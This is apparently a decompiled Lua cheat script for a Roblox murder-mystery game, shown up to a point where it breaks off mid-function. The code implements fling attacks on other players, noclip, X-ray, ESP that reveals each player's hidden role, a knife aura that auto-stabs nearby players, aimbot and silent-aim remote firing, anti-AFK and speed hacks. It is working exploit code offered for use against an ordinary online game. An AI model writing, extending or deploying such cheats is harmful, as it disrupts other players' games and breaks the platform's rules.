t3.value29 = {}
t3.value30 = {}
t3.value31 = false
local v30 = getgenv()
t1.value4 = "OldPos"
v30[t1.value4] = nil
local v31 = getgenv()
t1.value4 = "FPDH"
t1.value2 = workspace.FallenPartsDestroyHeight
v31[t1.value4] = t1.value2
t3.value32 = false
t3.value33 = false
t3.value34 = 0
t1.value13 = -1.5
t3.value35 = nil
t3.value36 = nil
t1.value10 = _G
t1.value10.WalkSpeed = 16
t1.value10 = _G
t1.value10.SilentAimKnifeHook = false
t1.value10 = _G
t1.value10.SilentAimGunHook = false
function t1.value36(p17)
    _G.NoclipEnabled = p17

    if p17 then
        t3.value35 = t3.value9.Stepped:Connect(function()
            if t3.value11.Character then
                for _, descendant in pairs(t3.value11.Character:GetDescendants()) do
                    if descendant:IsA("BasePart") then
                        descendant.CanCollide = false
                    end
                end
            end
        end)

        return
    end

    if t3.value35 then
        t3.value35:Disconnect()
    end
end
t1.value10 = _G
t1.value10.PredictKnifeType = "Traject"
t1.value10 = _G
t1.value10.PredictGunType = "Vazex"
t1.value10 = _G
t1.value10.HeadPrediction = false
t1.value10 = _G
t1.value10.HeadHitChance = 50
t1.value10 = _G
t1.value10.PingBased = false
t1.value10 = _G
t1.value10.ResolverAssistant = false
t1.value10 = _G
t1.value10.JumpPower = 50
t1.value10 = _G
t1.value10.ExtremeFlingEnabled = false
t1.value10 = _G
t1.value10.SpeedGlitchEnabled = false
t1.value10 = _G
t1.value10.GlitchSpeed = 35
t1.value10 = _G
function t1.value7()
    local v125 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

    if v125 then
        v125.Sit = true
    end
end
t1.value10.WhitelistEnabled = false
t1.value10 = _G
t1.value10.WhitelistFriends = false
t1.value10 = _G
t3.value37 = nil
t1.value10.WhitelistPlayers = {}
t1.value10 = _G
t1.value10.EspEnabled = false
t1.value10 = _G
t3.value38 = nil
t1.value10.AutoGrabEnabled = false
t1.value10 = _G
t1.value10.GunEspEnabled = false
t1.value10 = _G
t1.value10.SayRoleEnabled = false
t1.value10 = _G
t1.value10.NoclipEnabled = false
t1.value10 = _G
t1.value10.FlyEnabled = false
t1.value10 = _G
t1.value10.FlySpeed = 50
t1.value10 = _G
t1.value10.AntiAfkEnabled = true
t1.value10 = _G
t1.value10.FOVValue = 70
function t1.value2(p18)
    if not p18 or p18 == t3.value11 then
        return
    end

    local Character = t3.value11.Character
    local v128 = Character and Character:FindFirstChildOfClass("Humanoid")
    local v129 = v128 and v128.RootPart
    local Character2 = p18.Character

    if not Character2 or not v129 then
        return
    end

    local Humanoid = Character2:FindFirstChildOfClass("Humanoid")
    local v132 = Humanoid and Humanoid.RootPart
    local v133 = Humanoid
    local Head = Character2:FindFirstChild("Head")

    if Humanoid then
        v133 = Humanoid.Sit
    end

    if v133 then
        return
    end

    local CameraSubject = t3.value12.CameraSubject

    if Head then
        t3.value12.CameraSubject = Head
    elseif Humanoid then
        t3.value12.CameraSubject = Humanoid
    end

    if v129.Velocity.Magnitude < 50 then
        getgenv().OldPos = v129.CFrame
    end

    workspace.FallenPartsDestroyHeight = (0/0)

    local BodyVelocity = Instance.new("BodyVelocity")

    BodyVelocity.Parent = v129
    BodyVelocity.Velocity = Vector3.zero
    BodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
    v128:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    local n7 = 0

    for _ = 1, 150 do
        if not t3.value31 or (not v129 or not Humanoid) then
            break
        end

        n7 += 180
        v129.CFrame = CFrame.new(v132.Position) * CFrame.new(0, 2.5, 0) * CFrame.Angles(math.rad(n7), 0, 0)
        v129.Velocity = Vector3.new(200000000, 2500000000, 200000000)
        v129.RotVelocity = Vector3.new(2500000000, 2500000000, 2500000000)
        task.wait(0.03)
    end

    local Destroy = BodyVelocity.Destroy
    local GetDescendants = Character.GetDescendants

    Destroy(BodyVelocity)

    for _, v in pairs(GetDescendants(Character)) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.zero
            v.RotVelocity = Vector3.zero
        end
    end

    v128:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

    if CameraSubject and CameraSubject.Parent then
        t3.value12.CameraSubject = CameraSubject
    else
        t3.value12.CameraSubject = v128
    end

    if getgenv().OldPos then
        local n8 = 0

        if not ((v129.Position - getgenv().OldPos.p).Magnitude < 25) then
            if not (n8 > 50) then
            end
        end

        repeat
            v129.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
            v128:ChangeState(Enum.HumanoidStateType.GettingUp)
            task.wait()
            n8 += 1
        until (v129.Position - getgenv().OldPos.p).Magnitude < 25 or n8 > 50

        workspace.FallenPartsDestroyHeight = getgenv().FPDH or -500
    end

    v128.PlatformStand = false
    v128:ChangeState(Enum.HumanoidStateType.Running)
    task.wait(0.1)
    v128.WalkSpeed = _G.WalkSpeed or 16
end
t1.value10 = _G
t1.value11 = t3.value22[1]
t1.value10.Theme = t1.value11
t1.value10 = _G
t3.value39 = nil
function t1.value16(p19)
    _G.XrayEnabled = p19

    local function u145(p20, p21)
        local GetChildren = p20.GetChildren

        for _, v in pairs(GetChildren(p20)) do
            if v:IsA("BasePart") and (not v.Parent:FindFirstChild("Humanoid") and not v.Parent.Parent:FindFirstChild("Humanoid")) then
                v.LocalTransparencyModifier = p21
            end

            u145(v, p21)
        end
    end

    u145(workspace, not p19 and 0 or 0.9)
end
t1.value10.SilentAimEnabled = false
t1.value10 = _G
t3.value40 = nil
t1.value10.SilentAimKey = "E"
t1.value10 = _G
t1.value10.SilentAimMobile = false
t1.value10 = _G
t1.value10.NamesESP = false
t3.value41 = nil
t1.value10 = _G
t1.value10.TrapESP = false
t1.value10 = _G
t3.value42 = nil
t1.value10.EasyGlitch = false
t1.value10 = _G
t1.value10.Invisibility = false
t1.value10 = _G
t1.value10.CoinFarmEnabled = false
t1.value10 = _G
function t1.value21(p22)
    if not p22 or not p22.Character then
        return
    end

    local Character = t3.value11.Character

    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local v148 = Character:FindFirstChild("Knife") or t3.value11.Backpack and t3.value11.Backpack:FindFirstChild("Knife")

    if not v148 then
        return
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    if not Humanoid then
        return
    end

    if Character ~= v148.Parent then
        Humanoid:EquipTool(v148)
        task.wait(0.1)
        v148 = Character:FindFirstChild("Knife")

        if not v148 then
            return
        end
    end

    local HumanoidRootPart = p22.Character:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart then
        return
    end

    local HumanoidRootPart2 = Character:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart2 then
        return
    end

    local v152 = HumanoidRootPart.AssemblyLinearVelocity or Vector3.zero
    local v153 = (HumanoidRootPart2.Position - HumanoidRootPart.Position).Magnitude / 200
    local v154 = HumanoidRootPart.Position + v152 * v153
    local v155 = v148:FindFirstChild("Throw") or v148:FindFirstChild("Remote")

    if v155 then
        local HumanoidRootPart2Position = HumanoidRootPart2.Position

        pcall(function()
            v155:FireServer(CFrame.lookAt(HumanoidRootPart2Position, v154), CFrame.new(v154))
        end)
    end
end
t1.value10.XrayEnabled = false
t1.value10 = _G
t1.value10.AntiTrapEnabled = false
t1.value10 = _G
t1.value10.AntiFlingEnabled = false
t1.value10 = _G
t1.value10.AutoBreakGun = false
t1.value10 = _G
t1.value10.KnifeAuraEnabled = false
t1.value10 = _G
t1.value10.KnifeAuraRange = 20
t1.value10 = _G
t1.value10.FastThrowEnabled = false
t1.value10 = _G
t1.value10.FastThrowKey = "E"
t1.value10 = _G
t1.value10.KnifeSilentAimEnabled = false
t1.value10 = _G
t1.value10.KnifeSilentAimKey = "R"
t1.value10 = _G
t1.value10.AimbotEnabled = false
function t1.value35(p23)
    if not p23 or not p23.Character then
        return
    end

    local v158 = t3.value11.Character and t3.value11.Character:FindFirstChild("Trap")

    if not v158 then
        return
    end

    local Activate = v158:FindFirstChild("Activate")

    if Activate then
        Activate:FireServer(p23.Character.HumanoidRootPart.CFrame)
    end
end
t1.value10 = _G
t1.value10.AimbotKey = "Q"
t1.value10 = _G
t1.value10.ImproveFPS = false
t1.value10 = _G
t1.value10.RTXShaders = false
t1.value10 = _G
t1.value10.KorbloxEnabled = false
t3.value43 = nil
t1.value10 = _G
t1.value10.HeadlessEnabled = false
t1.value10 = _G
t1.value10.CoinFarmSpeed = 1
t1.value10 = _G
t1.value10.CoinType = "Coin and BeachBall"
t1.value10 = _G
function t1.value15(p24)
    if p24 == t3.value11 then
        return
    end

    local Character = p24.Character

    if not Character then
        return
    end

    local v162 = t3.value29[p24.Name]

    if v162 and v162.Dead or v162.Killed then
        local PreEspHighlight = Character:FindFirstChild("PreEspHighlight")

        if PreEspHighlight then
            PreEspHighlight:Destroy()
        end

        local EspNameTag = Character:FindFirstChild("EspNameTag")

        if EspNameTag then
            EspNameTag:Destroy()
        end

        return
    end

    local v165 = t3.value28[p24.Name] or v162 and v162.Role
    local v166 = Character:FindFirstChild("PreEspHighlight") or Instance.new("Highlight")

    v166.Name = "PreEspHighlight"
    v166.Parent = Character

    if v165 == "Murderer" then
        v166.FillColor = _G.MurdFill
        v166.FillTransparency = _G.MurdFillTrans
        v166.OutlineColor = _G.MurdOutline
        v166.OutlineTransparency = _G.MurdOutlineTrans
    elseif v165 == "Sheriff" then
        v166.FillColor = _G.SheriffFill
        v166.FillTransparency = _G.SheriffFillTrans
        v166.OutlineColor = _G.SheriffOutline
        v166.OutlineTransparency = _G.SheriffOutlineTrans
    elseif v165 == "Innocent" then
        v166.FillColor = _G.InnocentFill
        v166.FillTransparency = _G.InnocentFillTrans
        v166.OutlineColor = _G.InnocentOutline
        v166.OutlineTransparency = _G.InnocentOutlineTrans
    else
        v166.FillColor = _G.LobbyFill
        v166.FillTransparency = _G.LobbyFillTrans
        v166.OutlineColor = _G.LobbyOutline
        v166.OutlineTransparency = _G.LobbyOutlineTrans
    end

    if _G.NamesESP then
        if Character:FindFirstChild("Head") then
            local v167 = Character:FindFirstChild("EspNameTag") or Instance.new("BillboardGui")

            v167.Name = "EspNameTag"
            v167.Parent = Character
            v167.AlwaysOnTop = true
            v167.Size = UDim2.new(0, 200, 0, 50)
            v167.StudsOffset = Vector3.new(0, 2.5, 0)
            v167.MaxDistance = 500

            local v168 = v167:FindFirstChild("TextLabel") or Instance.new("TextLabel")

            v168.Name = "TextLabel"
            v168.Parent = v167
            v168.Size = UDim2.new(1, 0, 1, 0)
            v168.BackgroundTransparency = 1
            v168.Text = p24.Name
            v168.TextScaled = true
            v168.Font = Enum.Font.SourceSansBold
            v168.TextStrokeTransparency = 0.5

            if v165 == "Murderer" then
                v168.TextColor3 = _G.MurdFill

                return
            end

            if v165 == "Sheriff" then
                v168.TextColor3 = _G.SheriffFill

                return
            end

            if v165 == "Innocent" then
                v168.TextColor3 = _G.InnocentFill

                return
            end

            v168.TextColor3 = Color3.fromRGB(255, 255, 255)

            return
        end
    else
        local EspNameTag = Character:FindFirstChild("EspNameTag")

        if EspNameTag then
            EspNameTag:Destroy()
        end
    end
end
t1.value11 = Color3.fromRGB(255, 0, 0)
t1.value10.MurdFill = t1.value11
t1.value10 = _G
t1.value10.MurdFillTrans = 0.4
t1.value10 = _G
t1.value11 = Color3.fromRGB(255, 255, 255)
t1.value10.MurdOutline = t1.value11
t1.value10 = _G
t1.value10.MurdOutlineTrans = 0.1
t1.value10 = _G
function t1.value23()
    local Character = t3.value11.Character
    if not Character then
        return
    end
    local v171 = Character:FindFirstChild("Knife") or t3.value11.Backpack and t3.value11.Backpack:FindFirstChild("Knife")
    if not v171 then
        t3.value18("Throw", "No knife found", "Warning", nil, 2)

        return
    end
    local n9 = 1e999
    local v173
    local v174 = Character:FindFirstChild("HumanoidRootPart") and Character.HumanoidRootPart.Position or Vector3.zero
    for v177, v178 in ipairs(t3.value8:GetPlayers()) do

        if v178 ~= t3.value11 and (v178.Character and v178.Character:FindFirstChild("HumanoidRootPart")) then
            local Magnitude = (v174 - v178.Character.HumanoidRootPart.Position).Magnitude

            if Magnitude < n9 then
                n9 = Magnitude
                v173 = v178
            end
        end
    end
    if not v173 or (not v173.Character or not v173.Character:FindFirstChild("HumanoidRootPart")) then
        t3.value18("Throw", "No target found", "Warning", nil, 2)

        return
    end
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    if not Humanoid then
        return
    end
    if v171.Parent == t3.value11.Backpack then
        Humanoid:EquipTool(v171)
        task.wait(0.1)
        v171 = Character:FindFirstChild("Knife")

        if not v171 then
            return
        end
    end
    local HumanoidRootPart = v173.Character.HumanoidRootPart
    local HumanoidRootPartPosition = Character.HumanoidRootPart.Position
    local HumanoidRootPartPosition2 = HumanoidRootPart.Position
    local u184 = v171:FindFirstChild("Throw") or v171:FindFirstChild("Remote")
    if not u184 then
        local Events = v171:FindFirstChild("Events")

        if Events then
            u184 = Events:FindFirstChild("KnifeThrown") or Events:FindFirstChild("Throw")
        end
    end
    if not u184 then
        t3.value18("Throw", "Throw remote not found", "Error", nil, 2)

        return
    end
    local cFrame = CFrame.lookAt(HumanoidRootPartPosition, HumanoidRootPartPosition2)
    local cFrame2 = CFrame.new(HumanoidRootPartPosition2)
    local t29 = {
		[1] = cFrame,
		[2] = cFrame2
	}
    pcall(function()
        u184:FireServer(unpack(t29))
    end)
end
t1.value11 = Color3.fromRGB(0, 0, 255)
t1.value10.SheriffFill = t1.value11
t1.value10 = _G
t1.value10.SheriffFillTrans = 0.4
t1.value10 = _G
function t1.value3()
    if t3.value36 then
        t3.value36:Destroy()
        t3.value36 = nil
    end
end
t1.value11 = Color3.fromRGB
function t1.value6()
    local Character = t3.value11.Character
    local v190 = Character and Character:FindFirstChildOfClass("Humanoid")

    if not v190 or v190.Health <= 0 then
        return
    end

    local v191 = v190:GetState() == Enum.HumanoidStateType.Freefall or v190:GetState() == Enum.HumanoidStateType.Jumping

    v190.WalkSpeed = _G.SpeedGlitchEnabled and (not not v191 and _G.GlitchSpeed) or _G.WalkSpeed
    v190.JumpPower = _G.JumpPower
    v190.UseJumpPower = true
end
t3.value44 = nil
t1.value11 = t1.value11(255, 255, 255)
t1.value10.SheriffOutline = t1.value11
t1.value10 = _G
t3.value45 = nil
t1.value10.SheriffOutlineTrans = 0.1
t1.value10 = _G
function t1.value34()
    if t3.value37 then
        t3.value37:Destroy()
        t3.value37 = nil
    end
end
t1.value11 = Color3
t3.value46 = nil
t1.value11 = t1.value11.fromRGB(0, 255, 0)
t1.value10.InnocentFill = t1.value11
function t1.value38(p25)
    _G.AntiAfkEnabled = p25

    if p25 then
        t3.value45 = t3.value8.LocalPlayer.Idled:Connect(function()
            t3.value16:CaptureController()
            t3.value16:ClickButton2(Vector2.new())
        end)

        return
    end

    if t3.value45 then
        t3.value45:Disconnect()
    end
end
t1.value10 = _G
t1.value10.InnocentFillTrans = 0.4
t1.value10 = _G
t3.value47 = nil
t1.value11 = Color3.fromRGB(255, 255, 255)
t1.value10.InnocentOutline = t1.value11
t1.value10 = _G
t1.value10.InnocentOutlineTrans = 0.1
t1.value10 = _G
t1.value11 = Color3
t3.value48 = nil
t1.value11 = t1.value11.fromRGB(255, 255, 255)
t1.value10.LobbyFill = t1.value11
t1.value10 = _G
t1.value10.LobbyFillTrans = 1
t1.value10 = _G
t1.value11 = Color3
function t1.value26()
    for _, player in ipairs(t3.value8:GetPlayers()) do
        if player ~= t3.value11 and player.Character and (player.Character:FindFirstChild("Knife") or player.Backpack and player.Backpack:FindFirstChild("Knife")) then
            return player
        end
    end
end
function t1.value18(p26)
    _G.AntiTrapEnabled = p26

    if p26 then
        t3.value48 = t3.value9.Heartbeat:Connect(function()
            local Character = t3.value11.Character

            if Character and Character:FindFirstChildOfClass("Humanoid") then
                local Humanoid = Character:FindFirstChildOfClass("Humanoid")

                if Humanoid.WalkSpeed == 0.01 then
                    Humanoid.WalkSpeed = _G.WalkSpeed
                end
            end
        end)

        return
    end

    if t3.value48 then
        t3.value48:Disconnect()
        t3.value48 = nil
    end
end
t1.value11 = t1.value11.fromRGB(255, 255, 255)
t1.value10.LobbyOutline = t1.value11
t1.value10 = _G
t1.value10.LobbyOutlineTrans = 0.3
t1.value10 = _G
t1.value11 = Color3.fromRGB(255, 255, 0)
t1.value10.GunFill = t1.value11
t1.value10 = _G
function t1.value21(p27)
    _G.AntiFlingEnabled = p27

    if p27 then
        t3.value43 = t3.value9.Heartbeat:Connect(function()
            for _, player in ipairs(t3.value8:GetPlayers()) do
                local Character = player.Character

                if Character then
                    Character = player.Character:IsDescendantOf(workspace) and player.Character.PrimaryPart
                end

                if Character then
                    local Magnitude = player.Character.PrimaryPart.AssemblyAngularVelocity.Magnitude
                    local Magnitude2 = player.Character.PrimaryPart.AssemblyLinearVelocity.Magnitude

                    if Magnitude > 50 or Magnitude2 > 100 then
                        if not t3.value42[player.Name] then
                            t3.value18("Anti-Fling", "Flinger detected: " .. player.Name, "Warning", nil, 5)
                            t3.value42[player.Name] = true
                        end

                        for _, descendant in ipairs(player.Character:GetDescendants()) do
                            if descendant:IsA("BasePart") then
                                descendant.CanCollide = false
                                descendant.AssemblyAngularVelocity = Vector3.zero
                                descendant.AssemblyLinearVelocity = Vector3.zero
                                descendant.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                            end
                        end
                    end
                end
            end
        end)
        t3.value39 = t3.value9.Heartbeat:Connect(function()
            if t3.value11.Character and t3.value11.Character.PrimaryPart then
                local PrimaryPart = t3.value11.Character.PrimaryPart

                if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
                    PrimaryPart.AssemblyLinearVelocity = Vector3.zero
                    PrimaryPart.AssemblyAngularVelocity = Vector3.zero

                    if getgenv().OldPos then
                        PrimaryPart.CFrame = getgenv().OldPos

                        return
                    end
                else
                    getgenv().OldPos = PrimaryPart.CFrame
                end
            end
        end)

        return
    end

    if t3.value43 then
        t3.value43:Disconnect()
    end

    if t3.value39 then
        t3.value39:Disconnect()
    end

    t3.value42 = {}
end
t1.value10.GunFillTrans = 0.3
t1.value10 = _G
function t1.value29(p28)
    if not t3.value47 then
        t3.value18("Spectate", "Enable Spectate first!", "Warning", nil, 2)

        return
    end

    if not p28 or p28 == "" then
        t3.value12.CameraSubject = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")
        t3.value18("Spectate", "Stopped", "Info", nil, 2)

        return
    end

    local p28_2 = t3.value8:FindFirstChild(p28)

    if p28_2 and (p28_2.Character and p28_2.Character:FindFirstChildOfClass("Humanoid")) then
        t3.value12.CameraSubject = p28_2.Character:FindFirstChildOfClass("Humanoid")
        t3.value18("Spectate", "Now spectating: " .. p28_2.Name, "Info", nil, 2)

        return
    end

    t3.value18("Spectate", "Player not found or no character", "Error", nil, 2)
end
function t1.value24()
    t3.value46()
end
t1.value11 = Color3
function t1.value25()
    t3.value46()
end
t1.value11 = t1.value11.fromRGB
function t1.value14()

    for v201, v202 in ipairs(t3.value8:GetPlayers()) do

        if v202.Character then
            local PreEspHighlight = v202.Character:FindFirstChild("PreEspHighlight")

            if PreEspHighlight then
                PreEspHighlight:Destroy()
            end

            local EspNameTag = v202.Character:FindFirstChild("EspNameTag")

            if EspNameTag then
                EspNameTag:Destroy()
            end
        end
    end
    for _, v in pairs(t3.value30) do
        local GunDropHighlight = v:FindFirstChild("GunDropHighlight")

        if GunDropHighlight then
            GunDropHighlight:Destroy()
        end
    end
end
t1.value11 = t1.value11(255, 255, 255)
t1.value10.GunOutline = t1.value11
function t1.value33(p29)
    _G.KorbloxEnabled = p29

    if p29 then
        if t3.value40 then
            t3.value40:Disconnect()
        end

        t3.value40 = t3.value9.Heartbeat:Connect(function()
            local Character = t3.value11.Character

            if Character then
                for _, v in ipairs({
					"RightLowerLeg",
					"RightUpperLeg",
					"RightFoot"
				}) do
                    local v3 = Character:FindFirstChild(v)

                    if v3 then
                        if v == "RightLowerLeg" then
                            v3.MeshId = "http://www.roblox.com/asset/?id=902942093"
                            v3.Transparency = 1
                        elseif v == "RightUpperLeg" then
                            v3.MeshId = "http://www.roblox.com/asset/?id=902942096"
                            v3.TextureID = "http://www.roblox.com/asset/?id=902843398"
                        elseif v == "RightFoot" then
                            v3.MeshId = "http://www.roblox.com/asset/?id=902942089"
                            v3.Transparency = 1
                        end
                    end
                end
            end
        end)

        return
    end

    if t3.value40 then
        t3.value40:Disconnect()
        t3.value40 = nil
    end
end
t1.value10 = _G
t1.value10.GunOutlineTrans = 0
function t1.value13()
    for _, player in ipairs(t3.value8:GetPlayers()) do
        local Character = player.Character

        if Character then
            local Backpack = player:FindFirstChild("Backpack")

            if Character:FindFirstChild("Knife") or Backpack and Backpack:FindFirstChild("Knife") then
                t3.value28[player.Name] = "Murderer"
            elseif Character:FindFirstChild("Gun") or Backpack and Backpack:FindFirstChild("Gun") then
                t3.value28[player.Name] = "Sheriff"
            else
                t3.value28[player.Name] = nil
            end
        else
            t3.value28[player.Name] = nil
        end
    end
end
function t1.value12()
    local t30 = {}

    for _, player in ipairs(t3.value8:GetPlayers()) do
        if player ~= t3.value11 then
            table.insert(t30, player.Name)
        end
    end

    table.sort(t30)

    return t30
end
function t1.value10(p30)
    if not _G.WhitelistEnabled then
        return false
    end

    if _G.WhitelistFriends then
        local ok2, result = pcall(function()
            return t3.value11:IsFriendsWith(p30.UserId)
        end)

        if ok2 and result then
            return true
        end
    end

    if _G.WhitelistPlayers and _G.WhitelistPlayers[p30.Name] then
        return true
    end

    return false
end
t3.value49 = "MetanHub_FluentPro_Settings.json"
function t1.value4()
    local value11 = t3.value11
    local n10 = 0.1

    while t3.value44 do
        t3.value9.Heartbeat:Wait()

        local Character = value11.Character
        local v226 = Character and Character:FindFirstChild("HumanoidRootPart")

        if v226 then
            local Velocity = v226.Velocity

            v226.Velocity = Velocity * 10000 + Vector3.new(0, 10000, 0)
            t3.value9.RenderStepped:Wait()

            if v226 then
                v226.Velocity = Velocity
            end

            t3.value9.Stepped:Wait()

            if v226 then
                v226.Velocity = Velocity + Vector3.new(0, n10, 0)
                n10 = -n10
            end
        end
    end
end
local function v32()
    if not writefile then
        return
    end

    local t31 = {}

    for k, v in pairs(_G) do
        local v231 = type(v)
        local v232 = k
        local v233 = v231 == "string"

        if not v233 then
            v233 = v231 == "number"

            if not v233 then
                v233 = v231 == "boolean"
            end
        end

        if v233 then
            t31[v232] = v
        elseif v231 == "table" and v232 == "WhitelistPlayers" then
            local t32 = {}

            for k2 in pairs(v) do
                table.insert(t32, k2)
            end

            t31.WhitelistPlayers = t32
        else
            local v236 = v231 == "userdata"

            if v236 then
                v236 = typeof(v) == "Color3"
            end

            if v236 then
                t31[v232] = {
					v.R,
					v.G,
					v.B
				}
            end
        end
    end

    writefile(t3.value49, t3.value13:JSONEncode(t31))
end
function t1.value11()
    if not readfile or (not isfile or not isfile(t3.value49)) then
        return false
    end

    local ok3, result = pcall(function()
        return readfile(t3.value49)
    end)
    local v239 = result

    if not ok3 or not v239 then
        return false
    end

    local ok4, result2 = pcall(function()
        return t3.value13:JSONDecode(v239)
    end)
    local v242 = not ok4

    if not v242 then
        v242 = not result2
    end

    if v242 then
        return false
    end

    for k, v in pairs(result2) do
        local v245 = k

        if v245 == "WhitelistPlayers" then
            local t33 = {}

            for _, v4 in ipairs(v) do
                t33[v4] = true
            end

            _G.WhitelistPlayers = t33
        elseif type(v) == "table" and #v == 3 then
            _G[v245] = Color3.new(v[1], v[2], v[3])
        else
            _G[v245] = v
        end
    end

    pcall(function()
        t3.value7:SetTheme(_G.Theme)
    end)

    return true
end
t3.value50 = t1.value11
t3.value51 = t1.value12
t3.value52 = t1.value10
function t1.value12()
    if t3.value26 then
        local v249 = t3.value51()

        t3.value26:SetValues(v249)
        t3.value26:SetValue(nil)
        t3.value18("Spectate", "Player list refreshed", "Info", nil, 2)
    end
end
t3.value53 = t1.value13
function t1.value13(p31)
    t3.value53()

    for k, v in pairs(t3.value28) do
        if v ~= p31 then
            continue
        end

        local k3 = t3.value8:FindFirstChild(k)

        if k3 and (k3 ~= t3.value11 and k3.Character) then
            return k3
        end
    end

    return nil
end
t3.value54 = t1.value13
function t1.value13()
    local v254 = t3.value28[t3.value11.Name]

    if not v254 and t3.value29[t3.value11.Name] then
        v254 = t3.value29[t3.value11.Name].Role
    end

    return v254 or "Unknown"
end
t3.value55 = t1.value13
t3.value56 = t1.value14
t3.value57 = t1.value15
t3.value58 = t1.value16
t3.value48 = nil
function t1.value16(p32)
    _G.AimbotEnabled = p32

    if p32 then
        t3.value38 = true
        task.spawn(function()
            while t3.value38 do
                if t3.value54("Sheriff") ~= t3.value11 then
                    local v769 = t3.value54("Murderer")

                    if v769 and v769.Character then
                        local HumanoidRootPart = v769.Character:FindFirstChild("HumanoidRootPart")

                        if HumanoidRootPart then
                            t3.value12.CFrame = CFrame.lookAt(t3.value12.CFrame.Position, HumanoidRootPart.Position)
                        end
                    end
                end

                task.wait()
            end
        end)

        return
    end

    t3.value38 = false
end
t3.value59 = t1.value18
function t1.value15(p33)
    _G.KnifeAuraEnabled = p33

    if p33 then
        t3.value25 = t3.value9.Heartbeat:Connect(function()
            local Character = t3.value11.Character

            if not Character then
                return
            end

            local v772 = Character:FindFirstChild("Knife") or t3.value11.Backpack and t3.value11.Backpack:FindFirstChild("Knife")

            if not v772 then
                return
            end

            for _, player in ipairs(t3.value8:GetPlayers()) do
                if player ~= t3.value11 and (player.Character and not t3.value52(player)) then
                    local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

                    if HumanoidRootPart and (HumanoidRootPart.Position - Character.HumanoidRootPart.Position).Magnitude < _G.KnifeAuraRange then
                        if Character ~= v772.Parent then
                            t3.value11.Character.Humanoid:EquipTool(v772)
                        end

                        local Stab = v772:FindFirstChild("Stab")

                        if Stab then
                            Stab:FireServer("Down")
                        end

                        firetouchinterest(HumanoidRootPart, v772.Handle, 1)
                        firetouchinterest(HumanoidRootPart, v772.Handle, 0)
                    end
                end
            end
        end)

        return
    end

    if t3.value25 then
        t3.value25:Disconnect()
        t3.value25 = nil
    end
end
t3.value42 = {}
t3.value39 = nil
t3.value43 = nil
t3.value60 = t1.value21
function t1.value21()
    local value11 = t3.value11

    if not value11.Character then
        t3.value18("Error", "No character", "Error", nil, 2)

        return
    end

    local Backpack = value11:WaitForChild("Backpack")

    if Backpack:FindFirstChild("Fake Knife") then
        t3.value18("Error", "Already have fake knife", "Error", nil, 2)

        return
    end

    local Tool = Instance.new("Tool")

    Tool.Name = "Fake Knife"
    Tool.Grip = CFrame.new(0, -1.17, 0.07, 1, 0, 0, 0, 1, 0, 0, 0, 1)

    local Part = Instance.new("Part")

    Part.Size = Vector3.new(0.31, 3.42, 1.09)
    Part.Name = "Handle"
    Part.Transparency = 1
    Part.Parent = Tool
    Tool.Parent = Backpack

    local Animation = Instance.new("Animation")

    Animation.AnimationId = "rbxassetid://2467567750"

    local Animation2 = Instance.new("Animation")

    Animation2.AnimationId = "rbxassetid://1957890538"

    local t34 = {
		Animation,
		Animation2
	}

    value11:GetMouse().Button1Down:Connect(function()
        if Tool.Parent == value11.Character then
            local Humanoid = value11.Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                local track = Humanoid:LoadAnimation(t34[math.random(1, 2)])

                if track then
                    track:Play()
                end
            end
        end
    end)
    t3.value18("Fake Knife", "Created in backpack", "Success", nil, 3)
end
t3.value25 = nil
t3.value61 = t1.value15
function t1.value15()
    local Character = t3.value11.Character
    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        return nil
    end
    local HumanoidRootPartPosition = Character.HumanoidRootPart.Position
    local v266
    local huge = math.huge
    for _, player in ipairs(t3.value8:GetPlayers()) do
        if player ~= t3.value11 and (player.Character and (player.Character:FindFirstChild("HumanoidRootPart") and not t3.value52(player))) then
            local Magnitude = (HumanoidRootPartPosition - player.Character.HumanoidRootPart.Position).Magnitude

            if Magnitude < huge then
                huge = Magnitude
                v266 = player
            end
        end
    end

    return v266
end
t3.value46 = t1.value23
t3.value62 = t1.value24
t3.value63 = t1.value25
t3.value64 = t1.value26
function t1.value18()
    local Character = t3.value11.Character

    if not Character then
        t3.value18("SilentAim", "No character", "Error", nil, 2)

        return
    end

    local v272 = Character:FindFirstChild("Gun") or (Character:FindFirstChild("Revolver") or Character:FindFirstChild("Pistol"))

    if not v272 then
        t3.value18("SilentAim", "No gun equipped", "Error", nil, 2)

        return
    end

    local v273 = t3.value64()

    if not v273 or not v273.Character then
        t3.value18("SilentAim", "No murderer found", "Error", nil, 2)

        return
    end

    local v274 = v273.Character:FindFirstChild("Torso") or v273.Character:FindFirstChild("HumanoidRootPart")

    if not v274 then
        t3.value18("SilentAim", "Target has no body part", "Error", nil, 2)

        return
    end

    local Position = v274.Position
    local HumanoidRootPart = v273.Character:FindFirstChild("HumanoidRootPart")
    local Humanoid = v273.Character:FindFirstChildOfClass("Humanoid")
    local v278 = not HumanoidRootPart

    if not v278 then
        v278 = not Humanoid
    end

    if v278 then
        t3.value18("SilentAim", "Target has no root or humanoid", "Error", nil, 2)

        return
    end

    local Position2 = (v272:FindFirstChild("Handle") or (v272:FindFirstChild("Gun") or Character.HumanoidRootPart)).Position
    local u280 = Position
    local v281 = _G.TargetTracking[v273.Name]
    local elapsed = os.clock()

    if v281 then
        local v283 = elapsed - v281.prevTime

        if v283 > 0 and v283 < 0.5 then
            local n11 = 10

            u280 = Position + (HumanoidRootPart.Position - v281.prevPos) / v283 * ((HumanoidRootPart.Position - Position2).Magnitude / 2000 + 0.08)

            if n11 < (u280 - Position).Magnitude then
